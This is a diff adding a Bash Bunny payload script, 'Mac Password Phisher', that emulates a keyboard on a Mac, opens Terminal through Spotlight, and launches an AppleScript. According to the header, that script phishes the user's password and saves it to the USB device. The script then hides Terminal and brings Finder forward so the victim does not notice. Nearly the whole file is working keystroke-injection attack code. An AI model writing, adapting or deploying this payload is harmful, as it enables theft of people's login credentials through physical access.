@@ -1,0 +1,62 @@
+#!/bin/bash
+#
+# Title:         Mac Password Phisher
+# Author:        Ahhh (appended by SpoonNet)
+# Version:       1.1
+#
+# Prompts for user password, writes response to the bunny 
+#
+# Red................Starting
+# Yellow.............Executing payload
+# Green..............Finished
+#
+
+LED R SOLID
+
+LANGUAGE='us'
+
+# Gimme a Keyboard please. Thanks.
+ATTACKMODE HID STORAGE
+LED Y SOLID
+
+# need SWITCH_POSITION, so give it to me. please. thank you.
+source bunny_helpers.sh
+
+mkdir -p /root/udisk/$lootdir
+ 
+# Get a terminal
+QUACK DELAY 400
+QUACK GUI SPACE
+QUACK DELAY 300
+QUACK STRING terminal
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 400
+
+# Execute Payload
+QUACK STRING "osascript \/Volumes\/BashBunny\/payloads\/$SWITCH_POSITION\/goMessage.scpt &"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK DELAY 400
+QUACK GUI SPACE
+QUACK DELAY 300
+QUACK STRING terminal
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 400
+QUACK COMMAND 'h'
+QUACK DELAY 300
+QUACK GUI SPACE
+QUACK DELAY 300
+QUACK STRING finder
+QUACK DELAY 300
+QUACK ENTER
+QUACK DELAY 400
+
+
+
+# Sync filesystem
+sync
+
+# White is the official Light of "finished"
+LED G SOLID
